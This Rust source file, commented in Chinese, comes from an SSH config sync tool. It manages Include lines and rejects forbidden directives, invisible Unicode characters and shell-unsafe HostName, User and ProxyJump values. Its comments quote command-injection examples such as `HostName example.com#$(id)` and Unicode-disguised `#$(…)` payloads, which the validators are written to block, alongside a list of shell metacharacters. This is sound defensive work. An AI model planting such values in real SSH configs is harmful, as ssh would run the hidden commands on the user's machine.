//! 同步檔的 Host 區塊操作(space 檔 `~/.ssh/sshelter/<slug>-<id8>.config`,以及 v1 升級讀的 `hosts.config`)、主 config 最頂端那一行我們的 Include 清單,
//! 與同步檔裡禁用的 directive。區塊以原始文字為單位進出(lossless),其他項目(註解、空行、wildcard)原封不動。

use std::path::{Path, PathBuf};

use crate::config::model::{Directive, Item, Separator};
use crate::config::parser::parse_file;
use crate::config::serialize::{render_directive, serialize_items};
use crate::error::AppError;
use crate::sync::space_files;

/// v1 的同步檔 `~/.ssh/sshelter/hosts.config`:只剩 v1 升級會讀它(spec §7.6)。
pub fn managed_path(ssh_dir: &Path) -> PathBuf {
    ssh_dir.join("sshelter").join("hosts.config")
}

/// 主 config 的 Include 裡指到 v1 同步檔的那個 token:`~/.ssh/sshelter/hosts.config`(`managed_path` 的 Include 寫法)。
pub fn managed_token() -> String {
    format!("{}hosts.config", space_files::INCLUDE_DIR)
}

/// 「我們的」Include token(spec §4.3):`~/.ssh/sshelter/` **這一層**、以 `.config` 結尾的路徑 —— v1 的 `hosts.config`、各 space 檔,以及舊版或手寫的 glob
/// (`~/.ssh/sshelter/*.config`)都算。前綴之後再有路徑分隔字元(`/`、`\`)的 —— 子目錄、`..` —— 是使用者自己的 Include:app 從沒寫過,絕不收走、
/// 改寫或搬動(收走就是讓使用者的主機悄悄從 ssh 消失)。同樣刻意不碰、原樣留給使用者的(只可能是手寫的):帶引號的路徑(`"~/.ssh/sshelter/x.config"`,
/// token 帶著引號,不是以這個前綴開頭)、寫在 Host / Match 區塊裡的 Include(`ensure_include` 只看 top-level)、`~/.ssh/sshelter/` 底下不以 `.config` 結尾的路徑。
pub fn is_our_include_token(token: &str) -> bool {
    token.strip_prefix(space_files::INCLUDE_DIR).is_some_and(|rest| rest.ends_with(".config") && !rest.contains(['/', '\\']))
}

/// 生效中的 top-level `Include`:會被序列化成註解的不算,判斷與序列化器共用 `Directive::serializes_as_comment`(光看
/// `enabled` 不夠 —— 沒有 dirty 的 directive 照 `raw` 原樣寫出,在磁碟上仍是生效的一行)。
fn enabled_include(item: &Item) -> Option<&Directive> {
    match item {
        Item::Directive(d) if d.key == "include" && !d.serializes_as_comment() => Some(d),
        _ => None,
    }
}

fn has_our_token(item: &Item) -> bool {
    enabled_include(item).is_some_and(|d| d.value.split_whitespace().any(is_our_include_token))
}

/// 同步 Include 的位置:前導註解/空行與 SSHelter agent 的 Include(`agent::wiring`,必須是第一行)之後、其他任何項目(既有 Include、全域指令、Host/Match)之前。
/// 刻意不用 `newfile::include_insert_index`(它插在最後一個 Include **之後**):ssh 是
/// first-obtained-wins,同步檔必須是第一個被讀到的定義(agent 的 Include 除外:它排在最前面,spec §6),spec §10 的遮蔽承諾才成立。
fn sync_include_index(items: &[Item]) -> usize {
    items
        .iter()
        .position(|i| !matches!(i, Item::Blank(_) | Item::Comment(_)) && !crate::agent::wiring::is_agent_include(i))
        .unwrap_or(items.len())
}

/// 主 config 最頂端那一行我們的 Include(spec §4.3;位置見 `sync_include_index`)。`tokens` = 這台勾選的 space 檔的
/// Include 路徑,已依 `space_files::include_tokens` 排好;空 = 沒有勾選任何 space → 不留這一行。每一行 top-level Include 裡
/// 「我們的 token」(`is_our_include_token`,含 v1 的 `hosts.config` 與 glob)整批抽走、其他 token 留在原地(那一行只剩我們的 token 就整行移除),再在最頂端放一行
/// `Include <tokens>`。已經正確(最頂端那一行正好是這些 token、其他行沒有我們的 token)就不動。回傳是否改了 items。
pub fn ensure_include(items: &mut Vec<Item>, tokens: &[String]) -> bool {
    let top = sync_include_index(items);
    let correct = if tokens.is_empty() {
        !items.iter().any(has_our_token)
    } else {
        let at_top = items
            .get(top)
            .and_then(enabled_include)
            .is_some_and(|d| d.value.split_whitespace().eq(tokens.iter().map(String::as_str)));
        at_top && !items.iter().enumerate().any(|(i, item)| i != top && has_our_token(item))
    };
    if correct {
        return false;
    }
    // 由後往前:移除整行不影響前面的索引;Include 是 Directive,一定在 `top` 或之後,所以 `top` 也不變。
    for i in (0..items.len()).rev() {
        let rest: Vec<String> = match enabled_include(&items[i]) {
            Some(d) if d.value.split_whitespace().any(is_our_include_token) => d
                .value
                .split_whitespace()
                .filter(|t| !is_our_include_token(t))
                .map(str::to_string)
                .collect(),
            _ => continue,
        };
        if rest.is_empty() {
            items.remove(i);
        } else if let Item::Directive(d) = &mut items[i] {
            d.value = rest.join(" ");
            d.dirty = true;
            d.enabled = true; // 它是生效中的一行(`enabled_include`);標成 dirty 之後仍要寫成生效的一行,不能變成註解
        }
    }
    if !tokens.is_empty() {
        items.insert(top, Item::Directive(Directive::new("Include", &tokens.join(" "), "")));
    }
    true
}

/// 我們的 Include token 是不是 glob(使用者手寫的 `~/.ssh/sshelter/*.config` 之類)。
pub fn is_glob_token(token: &str) -> bool {
    token.contains(['*', '?', '['])
}

/// 我們的 glob token 涵不涵蓋 `token`(兩者都是 `~/.ssh/sshelter/…` 的寫法)。比對規則同 OpenSSH 的 glob:`*` 不跨 `/`、不對到
/// `.` 開頭的名稱、分大小寫。
fn glob_covers(glob: &str, token: &str) -> bool {
    let options = glob::MatchOptions { case_sensitive: true, require_literal_separator: true, require_literal_leading_dot: true };
    is_glob_token(glob) && glob::Pattern::new(glob).is_ok_and(|p| p.matches_with(token, options))
}

/// 主 config 有沒有一行生效中的 top-level Include 讀到 `token` 指的檔案:明確列出,或我們目錄的 glob 涵蓋它 —— 也就是
/// `release_include` 會為它改寫的那幾種。
pub fn lists_include(items: &[Item], token: &str) -> bool {
    items
        .iter()
        .filter_map(enabled_include)
        .flat_map(|d| d.value.split_whitespace())
        .any(|t| is_our_include_token(t) && (t == token || glob_covers(t, token)))
}

/// 離開帳戶(spec §7.3):每一行 top-level Include 裡「我們的」token 照 `kept`(舊 token → 新 token)原地換成
/// `~/.ssh/sshelter-local/` 的路徑 —— 不再是我們的 token,之後 `ensure_include` 不碰它們;位置與其他 token 都不動,ssh
/// 讀這些檔案的先後不變。只被我們目錄的 glob 涵蓋、沒有明確列出的搬走檔案(使用者手寫的 `~/.ssh/sshelter/*.config`),新 token
/// 放在檔案順序上第一個涵蓋它的 glob 前面 —— 搬出這個目錄之後 glob 就讀不到它了。對照不到的我們的 token(含 glob):`exists` 回
/// false(檔案已經不在、glob 一個檔案都對不到)就拿掉,整行只剩它們就移除;還在就原樣留著 —— 絕不讓一個還在的檔案悄悄從 ssh 讀的
/// 清單上消失(例如離開的同時同步輪次剛把它改了名,`kept` 裡是舊的名稱)。`exists` 由呼叫端把 token 對到磁碟上的檔案(判斷不了就
/// 當成還在)。回傳是否改了 items。
pub fn release_include(items: &mut Vec<Item>, kept: &[(String, String)], exists: impl Fn(&str) -> bool) -> bool {
    // 明確列出的搬走檔案在它自己的位置換掉;其餘的(只被 glob 涵蓋)各放一次。
    let mut placed: std::collections::BTreeSet<&str> = items
        .iter()
        .filter_map(enabled_include)
        .flat_map(|d| d.value.split_whitespace())
        .filter_map(|t| kept.iter().find(|(old, _)| old == t).map(|(old, _)| old.as_str()))
        .collect();
    let mut rewrites: Vec<(usize, Vec<String>)> = Vec::new();
    for (i, item) in items.iter().enumerate() {
        let Some(d) = enabled_include(item).filter(|d| d.value.split_whitespace().any(is_our_include_token)) else { continue };
        let mut line_changed = false;
        let mut tokens: Vec<String> = Vec::new();
        for t in d.value.split_whitespace() {
            if !is_our_include_token(t) {
                tokens.push(t.to_string());
                continue;
            }
            if let Some((_, new)) = kept.iter().find(|(old, _)| old == t) {
                tokens.push(new.clone());
                line_changed = true;
                continue;
            }
            let mut covered: Vec<&(String, String)> =
                kept.iter().filter(|(old, _)| !placed.contains(old.as_str()) && glob_covers(t, old)).collect();
            covered.sort();
            for (old, new) in covered {
                placed.insert(old.as_str());
                tokens.push(new.clone());
                line_changed = true;
            }
            if exists(t) {
                tokens.push(t.to_string());
            } else {
                line_changed = true;
            }
        }
        if line_changed {
            rewrites.push((i, tokens));
        }
    }
    let changed = !rewrites.is_empty();
    // 由後往前:移除整行不影響前面的索引。
    for (i, tokens) in rewrites.into_iter().rev() {
        if tokens.is_empty() {
            items.remove(i);
        } else if let Item::Directive(d) = &mut items[i] {
            d.value = tokens.join(" ");
            d.dirty = true;
            d.enabled = true; // 同 `ensure_include`:它是生效中的一行,標成 dirty 之後仍要寫成生效的一行,不能變成註解
        }
    }
    changed
}

/// 具名 pattern 才同步;含 wildcard/否定字元的 pattern(`*`、`*.internal`、`!x`)是裝置本地的 config 結構。
pub fn is_syncable_alias(alias: &str) -> bool {
    !alias.is_empty() && !alias.contains(['*', '?', '!'])
}

/// 整個區塊的同步資格:非空且**所有** pattern 都具名。`Host web *.internal` 的第一個 pattern 具名,
/// 但它是 wildcard 規則的一部分 —— 整個區塊不擷取、不上傳、不遷入、不套用、不刪除。
pub fn is_syncable_block(patterns: &[String]) -> bool {
    !patterns.is_empty() && patterns.iter().all(|p| is_syncable_alias(p))
}

pub(crate) fn first_alias(item: &Item) -> Option<&str> {
    match item {
        Item::Host(h) => h.patterns.first().map(String::as_str),
        _ => None,
    }
}

/// 第一個 pattern 等於 `alias` 的具名 Host 區塊位置。alias 本身是 wildcard、或本地那個同名區塊含
/// wildcard pattern(不能替換它、也不能在旁邊再附加一個 `Host alias`)→ Err;找不到 → Ok(None)。
fn syncable_host_position(items: &[Item], alias: &str) -> Result<Option<usize>, AppError> {
    if !is_syncable_alias(alias) {
        return Err(AppError::Other(format!("'{alias}' is a wildcard pattern; wildcard blocks are never synced")));
    }
    match items.iter().position(|i| first_alias(i) == Some(alias)) {
        Some(p) => match &items[p] {
            Item::Host(h) if is_syncable_block(&h.patterns) => Ok(Some(p)),
            _ => Err(AppError::Other(format!("local block '{alias}' has wildcard patterns and stays local"))),
        },
        None => Ok(None),
    }
}

/// 同步的檔案與記錄裡不允許的 directive(spec §4.2、§7.4)。解析器的 keyword(`Directive.keyword`)是「縮排之後、
/// 第一個空白或 `=` 之前」的原字串;它和 OpenSSH 讀 keyword 的方式(`strdelim`)在兩種已知的寫法上分歧
/// (`QuotedKeyword`、`LeadingEquals`),這兩種一律拒絕 —— 其餘的行,`d.key` 就是 OpenSSH 讀到的 keyword
/// (不分大小寫),`Include` 禁令與 §7.4 的核准判斷才靠得住。
///
/// 另外兩類不是 keyword 的問題,而是「核准簽章看不到的東西」:`UnsafeValue`(值會被 ssh 展開進指令,簽章只涵蓋
/// 受管制那一行的文字,涵蓋不到它引用的別行的值)與 `InvisibleCharacter`(解析器與 OpenSSH 對空白的定義不同,
/// 簽章看到的和 ssh 讀到的不是同一個字串)。`StrayCharacter` 是整段交給 shell 的那幾行(`ProxyCommand` 等):畫面上看起來是註解的地方,shell
/// 讀到的不是註解。`MisreadHeader` 是 Host / Match 那一行本身:解析器與 OpenSSH 切註解的
/// 方式不同,區塊實際套用到哪些主機就和解析器以為的不同(連 wildcard 都能藏進去)。
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Forbidden {
    /// `Include`(不分大小寫,`Include=…` 也算):引入的檔案內容在核准之後仍可改變,無法靠核准涵蓋。
    Include,
    /// keyword 帶雙引號(例如 `"ProxyCommand"`)。OpenSSH 會去掉 keyword 的引號照樣生效
    /// (`"ProxyCommand" …`、`Proxy"Command"nc …` 都是 ProxyCommand),解析器的 keyword 卻帶著引號。
    /// 刻意不帶 keyword 的內容:它可能夾著值(`HostName"10.1.2.3"`),印進錯誤訊息就會連值一起進到狀態列。
    QuotedKeyword,
    /// 行首(縮排之後)是 `=`,解析器的 keyword 是空字串。OpenSSH 會略過這個 `=`、把下一個詞當成 keyword
    /// (`=Include x`、`= ProxyCommand …`、`="Include" x`、`=Match all`、`=Host *` 都照常生效),解析器卻看不到。
    LeadingEquals,
    /// `HostName`、`User`、`HostKeyAlias`、`ProxyJump` 的值(欄位是 keyword 在訊息裡的名稱)不是「恰好一個、不含 shell
    /// 字元的詞」。這四個值就是 `%h`、`%r`、`%k`、`%j`(ssh_config(5) 的 TOKENS):ssh 把它們原樣、不加引號也不跳脫地
    /// 展開進交給 shell 的指令 —— `ProxyCommand`(`%h`、`%r`)、`LocalCommand`(全部)、`KnownHostsCommand`(`%h`、`%j`、
    /// `%k`、`%r`),以及 `ProxyJump` 隱含的 `ssh -W` 指令(`%h`)。ssh 只在命令列上擋這些字元,設定檔讀進來的值不擋。
    /// 所以值裡有 shell 字元,就等於遠端能在本機執行指令,而且連一個受管制的 keyword 都沒有,簽章提醒不了使用者。
    UnsafeValue(&'static str),
    /// 那一行 OpenSSH 會讀的部分(它當成註解的部分除外,見 `has_invisible_character`)有非 ASCII 的空白(U+00A0、U+2000
    /// 等)、BOM、任何一個 General_Category=Cf 的格式字元(雙向文字控制、零寬字元、U+0600–U+0605 一類的阿拉伯文記號 ……,見
    /// `is_format_character`),或控制字元(C0、DEL 與 C1,見 `is_invisible`;tab 與行尾的 CR 除外)。OpenSSH 只在空格、tab、CR、LF 處斷詞,
    /// 解析器卻把非 ASCII 的空白當成空白吃掉(去前後空白、吃分隔符),簽章與檢查看到的和 ssh 讀到的不同;格式字元與控制字元則讓核准對話框
    /// 顯示的文字和 ssh 讀到的不同。空行與整行註解的縮排也算:OpenSSH 不把這些字元當成空白,那一行對它就不是空行或註解。畫不出東西的字元也算:預設不顯示的字元
    /// (`Default_Ignorable_Code_Point`:韓文填充字 U+3164、U+115F、U+FFA0,組合字元連接符 U+034F,變體選擇符 U+FE0F ……,見
    /// `is_default_ignorable`)與設計上就是空白的 U+2800、U+1D159、U+13441、U+13442、U+303F(`is_blank_by_design`)—— `bastion<U+3164>#$(…)`
    /// 讀起來像註解,shell 卻把 `#` 當成詞中間的字元、照樣執行 `$(…)`。
    InvisibleCharacter,
    /// `RAW_LINE_KEYWORDS` 那幾行(整段交給 shell)裡,一個詞的開頭(ASCII 空白、`=` 或其他 ASCII 標點之後,或值的第一個字元)是非
    /// ASCII、卻畫不出自己位置的字元(`has_stray_character`)—— 多半是沒有基底字的組合記號。shell 把它當成詞的一部分,`#` 因此在
    /// 詞的中間、不是註解(`nc %h %p;<U+0301>#$(…)` 照樣執行 `$(…)`),畫面上記號卻疊在前一個字元上,`#` 看起來仍像註解的開頭。
    /// 非 ASCII 的符號開頭的詞一樣擋(命令列用不到)。訊息同樣不印出那一行。
    StrayCharacter,
    /// `Host` 或 `Match` 那一行(欄位是 keyword 在訊息裡的名稱):OpenSSH 讀到的 pattern 與解析器的不同,或那一行 OpenSSH
    /// 會讀的部分含引號或反斜線。OpenSSH 只在空格與 tab 處分詞,`#` 要在一個詞的開頭才是註解;解析器卻把第一個不在雙引號
    /// 裡的 `#` 之後都當成註解 —— `Host web#x *` 對解析器只有 `web`,OpenSSH 讀到的卻是 `web#x` 與 `*`,一筆看似只管 `web`
    /// 的記錄就改了每一台主機的設定(OpenSSH 10.3p1 `ssh -G` 實測)。引號與反斜線兩邊的處理也不同(`Host "web *"` 對 OpenSSH
    /// 是一個含空白的 pattern、`Host web\ x` 是 `web x`),一律拒絕。訊息同樣不印出那一行。
    MisreadHeader(&'static str),
}

impl Forbidden {
    /// 錯誤訊息裡的描述(英文名詞片語,接在 "contains " 後面)。絕不印出 keyword 或那一行的任何內容:
    /// 兩者都可能夾著值(主機位址、金鑰路徑),而訊息會進狀態列與持久化的 `last_error`。`UnsafeValue` 的欄位是
    /// `&'static str`(固定的 keyword 名稱),印出來不會帶出使用者的內容。
    pub fn describe(&self) -> String {
        match self {
            Forbidden::Include => "an Include line".to_string(),
            Forbidden::QuotedKeyword => "a quoted keyword (OpenSSH reads it differently from SSHelter)".to_string(),
            Forbidden::LeadingEquals => "a line starting with '=' (OpenSSH reads the next word as its keyword)".to_string(),
            Forbidden::UnsafeValue(keyword) => format!("a {keyword} value with characters ssh would pass to a shell"),
            Forbidden::InvisibleCharacter => {
                "a line with a non-ASCII space or control character, or an invisible formatting character (OpenSSH would read something other than what SSHelter shows)".to_string()
            }
            Forbidden::StrayCharacter => {
                "a command with a combining mark or symbol where a word starts (it could disguise where a shell comment begins)".to_string()
            }
            Forbidden::MisreadHeader(keyword) => format!("a {keyword} line that OpenSSH reads differently from SSHelter"),
        }
    }
}

/// 值會被 ssh 展開進指令的四個 keyword:`(小寫 keyword, 訊息裡的名稱)`。見 `Forbidden::UnsafeValue`。
const SHELL_BOUND_KEYWORDS: [(&str, &str); 4] =
    [("hostname", "HostName"), ("user", "User"), ("hostkeyalias", "HostKeyAlias"), ("proxyjump", "ProxyJump")];

/// 這四個值裡不能出現的字元:ssh 自己對命令列上的主機名稱擋的那一組,去掉逗號 —— `ProxyJump` 的清單要用逗號。
/// OpenSSH 10.3p1 逐字元實測:`ssh -G 'a<c>b'` 對 `` " $ & ' ( ) , ; < > \ ` { | } `` 回 hostname contains invalid
/// characters,開頭的 `-` 與空白、控制字元也一樣。ssh 只在命令列上擋,設定檔讀進來的值不擋,卻一樣會被展開進指令。
const SHELL_CHARACTERS: &str = "'`\"$\\;&<>|(){}";

/// 依 OpenSSH 讀設定值的方式,檢查 keyword 之後的值是不是「恰好一個、不含 shell 字元的詞」。keyword 之後的整段文字 =
/// 解析器的 value + 行尾空白 + 它當成行尾註解的部分;以空白切成詞,遇到以 `#` 開頭的詞就停(那才是註解 ——
/// `HostName example.com#$(id)` 的 `#` 在詞的中間,是值的一部分,整段都要看;`ssh -G` 實測)。值必須恰好一個詞、
/// 不以 `-` 開頭(會被當成選項)、不含 `SHELL_CHARACTERS` 與控制字元;`ProxyJump` 的每一個 hop 也一樣不能以 `-` 開頭
/// (`has_dash_hop`)。引號與反斜線都在被擋的字元裡,所以不必處理 OpenSSH 對引號與跳脫的拆法:有引號的值一律拒絕。
fn is_plain_shell_bound_value(d: &Directive) -> bool {
    let text = format!("{}{}{}", d.value, d.trailing_ws, d.inline_comment.as_deref().unwrap_or(""));
    let mut words = text.split_ascii_whitespace().take_while(|word| !word.starts_with('#'));
    match (words.next(), words.next()) {
        (Some(word), None) => {
            !word.starts_with('-')
                && !word.chars().any(|c| c.is_control() || SHELL_CHARACTERS.contains(c))
                && !(d.key == "proxyjump" && has_dash_hop(word))
        }
        _ => false,
    }
}

/// `ProxyJump` 清單(逗號分隔)裡有沒有以 `-` 開頭的 hop,或主機部分以 `-` 開頭的 hop。ssh 把最後一個 hop 的主機原樣接在
/// 隱含的 `ssh … -W '[%h]:%p' <主機>` 指令最後、其餘的 hop 接在 `-J` 後面(OpenSSH 10.3p1 執行檔裡的格式字串
/// `%s…%.*s -W '[%%h]:%%p' %s` 與 ` -J `),以 `-` 開頭的主機會被讀成選項(`-oProxyCommand=…`)。主機部分 = 去掉
/// `ssh://`、最後一個 `@` 之前的使用者之後的部分,IPv6 的 `[` 之後也算(`u@-x`、`[-x]:22`、`ssh://-x@h`)。OpenSSH 10.3p1
/// 的 `ssh -G` 對這些寫法都照收,不會先擋下。
fn has_dash_hop(value: &str) -> bool {
    value.split(',').any(|hop| {
        let hop = hop.strip_prefix("ssh://").unwrap_or(hop);
        let host = hop.rsplit_once('@').map_or(hop, |(_, host)| host);
        hop.starts_with('-') || host.starts_with('-') || host.starts_with("[-")
    })
}

/// 解析器當成空白(`char::is_whitespace`)、OpenSSH 卻不當成空白的字元:非 ASCII 的空白(U+0085、U+00A0、U+1680、
/// U+2000–U+200A、U+2028、U+2029、U+202F、U+205F、U+3000),加上 BOM(U+FEFF;它不算空白,但同樣看不見)。
fn is_confusable_space(c: char) -> bool {
    (!c.is_ascii() && c.is_whitespace()) || c == '\u{feff}'
}

/// 每一個 General_Category=Cf(Format,格式字元)的字元,共 21 段、170 個碼位:雙向文字控制、零寬字元與不可見的運算符號(U+061C、U+200B–U+200F、U+202A–U+202E、
/// U+2060–U+206F 去掉未指派的 U+2065)、軟連字號(U+00AD)、BOM(U+FEFF)、阿拉伯文的數字記號與句末記號(U+0600–U+0605、U+06DD、U+08E2)與貨幣記號(U+0890–U+0891)、敘利亞文的縮寫記號(U+070F)、蒙古文的母音分隔符(U+180E)、
/// 行間註記(U+FFF9–U+FFFB)、卡提文的數字記號(U+110BD、U+110CD)、埃及象形文字的格式控制(U+13430–U+1343F)、速記與樂譜的格式控制(U+1BCA0–U+1BCA3、U+1D173–U+1D17A)、
/// 語言標籤與標籤字元(U+E0001、U+E0020–U+E007F)。它們畫不出自己的字形,解析器與 OpenSSH 都把它們當成一般字元,畫面上的文字卻和實際的不同(雙向控制會把後面的文字倒過來顯示)——
/// 核准對話框顯示的就不是 ssh 讀到的設定。多數同時是 `Default_Ignorable_Code_Point`(`is_default_ignorable`);只在這裡擋的有 U+0600–U+0605、U+06DD、U+070F、U+0890–U+0891、
/// U+08E2、U+FFF9–U+FFFB、U+110BD、U+110CD、U+13430–U+1343F。`char` 沒有公開 General_Category,不加 crate,所以範圍手寫在這裡。範圍對照過 Unicode 16.0.0(regex-syntax 0.8.10 的
/// `unicode_tables/general_category.rs` 的 `FORMAT` 表、Python 3.14 的 `unicodedata`)與 17.0(Node 24.21.0、ICU 78.3 的 `\p{Cf}`),三份一模一樣。Unicode 日後新增 Cf 的字元,要回來補。
fn is_format_character(c: char) -> bool {
    matches!(
        c,
        '\u{00ad}'
            | '\u{0600}'..='\u{0605}'
            | '\u{061c}'
            | '\u{06dd}'
            | '\u{070f}'
            | '\u{0890}'..='\u{0891}'
            | '\u{08e2}'
            | '\u{180e}'
            | '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{206f}'
            | '\u{feff}'
            | '\u{fff9}'..='\u{fffb}'
            | '\u{110bd}'
            | '\u{110cd}'
            | '\u{13430}'..='\u{1343f}'
            | '\u{1bca0}'..='\u{1bca3}'
            | '\u{1d173}'..='\u{1d17a}'
            | '\u{e0001}'
            | '\u{e0020}'..='\u{e007f}'
    )
}

/// 預設不顯示的字元:Unicode 的 `Default_Ignorable_Code_Point`(DerivedCoreProperties.txt),字型與排版引擎不把它們畫出來 —— 軟連字號(U+00AD)、
/// 組合字元連接符(U+034F)、韓文填充字(U+115F、U+1160、U+3164、U+FFA0)、高棉的固有母音(U+17B4–U+17B5)、蒙古文的變體選擇符與母音分隔符
/// (U+180B–U+180F)、零寬與雙向控制(U+061C、U+200B–U+200F、U+202A–U+202E、U+2060–U+206F)、變體選擇符(U+FE00–U+FE0F)、BOM(U+FEFF)、保留給
/// Specials 區的 U+FFF0–U+FFF8、速記格式控制(U+1BCA0–U+1BCA3)、樂譜格式控制(U+1D173–U+1D17A),以及 U+E0000–U+E0FFF 整段(標籤字元、補充區的變體
/// 選擇符 U+E0100–U+E01EF,與其餘保留的碼位)。解析器與 OpenSSH 都把它們當成一般字元,畫面上卻看不見:`bastion<U+3164>#$(…)` 讀起來像是 `#` 前面有
/// 空白、後面是註解,shell 卻把 `#` 當成詞中間的字元、照樣執行 `$(…)`(`/bin/sh -c 'echo bastion<U+3164>#$(echo X)'` 印出 `bastion<U+3164>#X`)。
/// 範圍對照過 Unicode 16.0.0 與 17.0.0 的資料,兩版一模一樣(17 段)。`char` 沒有公開這個屬性,不加 crate,所以範圍手寫在這裡 —— Unicode 日後
/// 新增預設不顯示的字元,要回來補。它與 `is_format_character`(每一個 Cf)大部分重疊,但誰也不是誰的子集:只在 `is_format_character` 的是 Cf 裡不預設隱藏的
/// U+0600–U+0605、U+06DD、U+070F、U+0890–U+0891、U+08E2、U+FFF9–U+FFFB、U+110BD、U+110CD、U+13430–U+1343F;只在這裡的是不屬於 Cf 的 U+034F、U+115F–U+1160、
/// U+17B4–U+17B5、U+180B–U+180D、U+180F、U+2065(未指派)、U+3164、U+FE00–U+FE0F、U+FFA0、U+FFF0–U+FFF8,以及 U+E0000–U+E0FFF 裡不是 Cf 的碼位
/// (Unicode 17 的兩個屬性逐一比對過)。`is_invisible` 兩個都擋。
fn is_default_ignorable(c: char) -> bool {
    matches!(
        c,
        '\u{00ad}'
            | '\u{034f}'
            | '\u{061c}'
            | '\u{115f}'..='\u{1160}'
            | '\u{17b4}'..='\u{17b5}'
            | '\u{180b}'..='\u{180f}'
            | '\u{200b}'..='\u{200f}'
            | '\u{202a}'..='\u{202e}'
            | '\u{2060}'..='\u{206f}'
            | '\u{3164}'
            | '\u{fe00}'..='\u{fe0f}'
            | '\u{feff}'
            | '\u{ffa0}'
            | '\u{fff0}'..='\u{fff8}'
            | '\u{1bca0}'..='\u{1bca3}'
            | '\u{1d173}'..='\u{1d17a}'
            | '\u{e0000}'..='\u{e0fff}'
    )
}

/// 設計上就是空白、卻不在 `Default_Ignorable_Code_Point` 裡的字元:點字的空白(U+2800)、樂譜的空符頭(U+1D159)、埃及象形文字的全空白與半空白
/// (U+13441、U+13442)、表意文字的半形填充空白(U+303F)。它們不是空白(`char::is_whitespace` 為 false),字型有的畫成一格空白、沒有的畫成方框 ——
/// 擺在 `#` 前面,同樣讓 `#` 看起來像接在空白後面。
fn is_blank_by_design(c: char) -> bool {
    matches!(c, '\u{2800}' | '\u{1d159}' | '\u{13441}' | '\u{13442}' | '\u{303f}')
}

/// `Forbidden::InvisibleCharacter` 擋的字元:`is_confusable_space`、`is_format_character`(每一個 Cf)、`is_default_ignorable`、`is_blank_by_design`,以及 tab 以外的控制字元
/// (`char::is_control` = General_Category=Cc:C0 的 U+0000–U+001F、DEL 與 C1 的 U+0080–U+009F,C1 也包括 U+0085)。一個前端測試(`src/lib/hidden-parity.test.ts`)讀這個函式與上面
/// 幾個函式的宣告,確認核准對話框的 `revealHidden` 把這裡擋的每一個碼位都顯示出來 —— 改了這裡的形狀,那個測試會明白地失敗,要一併更新。
fn is_invisible(c: char) -> bool {
    is_confusable_space(c)
        || is_format_character(c)
        || is_default_ignorable(c)
        || is_blank_by_design(c)
        || (c.is_control() && c != '\t')
}

/// 這個字元自己畫得出一個位置:字母或數字,而且不是組合記號。`is_alphanumeric` 單獨不夠 —— `Alphabetic` 屬性帶著 1380 個組合記號(Unicode 17;
/// 阿拉伯文的 U+064B、希伯來文的 U+05B0、泰文的 U+0E31、天城文的 U+0941 ……),它們沒有基底字時一樣疊在前一個字元上。`char` 沒有公開 General_Category,
/// 不加 crate:`char::escape_debug` 會把 Grapheme_Extend 的字元(所有的 Mn 與 Me,加上少數 Mc)跳脫成 `\u{…}`,其他可印的字元原樣吐出一個字元 —— 借它認出
/// 會疊上去的記號(對 Unicode 17 的 `\p{M}` 逐一核對過:2059 個 Mn 與 13 個 Me 全部認得出來,Mc 認得 66 個,其餘 405 個 Mc 是占自己寬度、畫得出來的
/// 間距記號,`has_stray_character` 不擋)。
fn is_base_letter_or_digit(c: char) -> bool {
    c.is_alphanumeric() && c.escape_debug().count() == 1
}

/// OpenSSH 把 keyword 之後的整段文字原樣拿去用、不切註解的 keyword:對 OpenSSH 10.3p1 認得的每一個 keyword 以 `ssh -G`
/// 實測(`ProxyCommand x1 #y2` 印出 `proxycommand x1 #y2`),只有這五個。這幾行沒有「OpenSSH 當成註解的部分」:`#` 之後
/// 一樣交給 shell 或送給伺服器。
const RAW_LINE_KEYWORDS: [&str; 5] = ["proxycommand", "localcommand", "remotecommand", "knownhostscommand", "versionaddendum"];

/// 那一行(照序列化器寫出的樣子:沒有 dirty 就是原始的 `raw`)在 OpenSSH 會讀的部分有沒有 `is_invisible` 的字元。OpenSSH
/// 當成註解的部分(`openssh_comment_offset`)不看:ssh 不讀它,所以註解裡的全形空白(`Host web # 辦公室　主機`)照常可用。
/// CRLF 的檔案要照常通過:lexer 以 `\n` 切行,換行之前的 `\r` 留在那一行的最後(沒有行尾註解時在 `trailing_ws`、有註解時
/// 在註解的結尾、沒有值時在分隔符),所以先去掉最後一個 `\r`;第二個 `\r` 或行中間的 `\r` 照擋。
fn has_invisible_character(d: &Directive) -> bool {
    let line = render_directive(d);
    let line = line.strip_suffix('\r').unwrap_or(&line);
    line[..openssh_comment_offset(d, line).unwrap_or(line.len())].chars().any(is_invisible)
}

/// `RAW_LINE_KEYWORDS` 那幾行:值裡一個詞的開頭 —— ASCII 空白、`=` 或其他 ASCII 標點(`;`、`&`、`|`、括號、引號 ……)之後,或值的第一個字元 —— 有沒有非
/// ASCII、卻畫不出自己位置的字元(`is_base_letter_or_digit` 為 false:組合記號、符號、標點)。這幾行整段交給 shell,shell 以空白與 `;&|()<>` 斷詞,`#` 要在
/// 詞的開頭才是註解。沒有基底字的組合記號(`nc %h %p;<U+0301>#$(…)`)畫出來疊在前一個字元上,`#` 看起來仍接在 `;` 或空白後面、像註解的開頭,對 shell 那個
/// 記號卻是詞的一部分、`#` 在詞的中間,`$(…)` 照樣執行(`/bin/sh -c 'echo a;<U+0301>#$(echo X)'` 執行了 `$(…)`)。非 ASCII 的符號開頭的詞一樣擋,命令列用不到。
/// 接在字母或數字後面的記號(`cafe` + U+0301)、CJK 與其他文字的字母(`/Users/<CJK 字母>/bin/proxy`)不受影響。值 = 分隔符之後的整段,含行尾空白與 `#` 之後
/// —— 這幾行沒有 OpenSSH 的註解,shell 全部讀。
fn has_stray_character(d: &Directive) -> bool {
    if !RAW_LINE_KEYWORDS.contains(&d.key.as_str()) {
        return false;
    }
    let line = render_directive(d);
    let line = line.strip_suffix('\r').unwrap_or(&line);
    let separator = match &d.separator {
        Separator::Space(s) | Separator::Equals(s) => s,
    };
    // 切不到(欄位與那一行對不上,不該發生)就整行都當成值,從嚴。
    let value = line.get(d.indent.len() + d.keyword.len() + separator.len()..).unwrap_or(line);
    let mut previous: Option<char> = None; // None:值的第一個字元
    for c in value.chars() {
        let starts_a_word = match previous {
            None => true,
            Some(p) => p.is_ascii() && !p.is_ascii_alphanumeric(),
        };
        if starts_a_word && !c.is_ascii() && !is_base_letter_or_digit(c) {
            return true;
        }
        previous = Some(c);
    }
    false
}

